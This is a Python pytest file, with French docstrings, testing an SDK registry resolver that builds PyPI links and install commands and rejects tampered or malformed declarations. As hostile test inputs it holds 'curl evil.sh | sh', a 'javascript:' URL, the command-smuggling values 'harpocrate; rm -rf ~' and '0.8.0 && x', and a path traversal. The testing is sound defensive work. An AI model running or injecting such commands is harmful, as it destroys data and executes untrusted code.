"""Tests sdk_registry — distribution d'un SDK par le registre officiel de son langage."""

from __future__ import annotations

from typing import Any

import pytest

from app.services.sdk_registry import resolve_registry_distribution


def test_resolve_registry_pypi_derives_url_and_install_commands() -> None:
    dist = resolve_registry_distribution(
        "python", {"name": "pypi", "package": "harpocrate", "version": "0.8.0"}
    )
    assert dist == {
        "name": "pypi",
        "label": "PyPI",
        "package": "harpocrate",
        "version": "0.8.0",
        "url": "https://pypi.org/project/harpocrate/",
        "install_commands": ["pip install harpocrate", "uv add harpocrate"],
    }


def test_resolve_registry_absent_returns_none() -> None:
    assert resolve_registry_distribution("bash", None) is None


def test_resolve_registry_ignores_url_and_commands_from_index() -> None:
    """Un index.json altéré ne peut pas injecter son propre lien ni sa commande."""
    dist = resolve_registry_distribution(
        "python",
        {
            "name": "pypi",
            "package": "harpocrate",
            "version": "0.8.0",
            "url": "javascript:alert(1)",
            "install_commands": ["curl evil.sh | sh"],
        },
    )
    assert dist is not None
    assert dist["url"] == "https://pypi.org/project/harpocrate/"
    assert dist["install_commands"] == ["pip install harpocrate", "uv add harpocrate"]


@pytest.mark.parametrize(
    "raw",
    [
        "pypi",
        ["pypi"],
        {"name": "evil-registry", "package": "harpocrate", "version": "0.8.0"},
        {"package": "harpocrate", "version": "0.8.0"},
        {"name": "pypi", "package": "harpocrate; rm -rf ~", "version": "0.8.0"},
        {"name": "pypi", "package": "../../etc", "version": "0.8.0"},
        {"name": "pypi", "package": "", "version": "0.8.0"},
        {"name": "pypi", "package": "-harpocrate", "version": "0.8.0"},
        {"name": "pypi", "package": "harpocrate", "version": "latest"},
        {"name": "pypi", "package": "harpocrate", "version": "0.8.0 && x"},
        {"name": "pypi", "package": "harpocrate"},
        {"name": "pypi", "package": 42, "version": "0.8.0"},
    ],
)
def test_resolve_registry_invalid_declaration_returns_none(raw: Any) -> None:
    assert resolve_registry_distribution("python", raw) is None


@pytest.mark.parametrize("version", ["0.8.0", "1.0", "2.0.0rc1", "1.2.3.post1", "10.20.30"])
def test_resolve_registry_accepts_pep440_like_versions(version: str) -> None:
    dist = resolve_registry_distribution(
        "python", {"name": "pypi", "package": "harpocrate", "version": version}
    )
    assert dist is not None
    assert dist["version"] == version
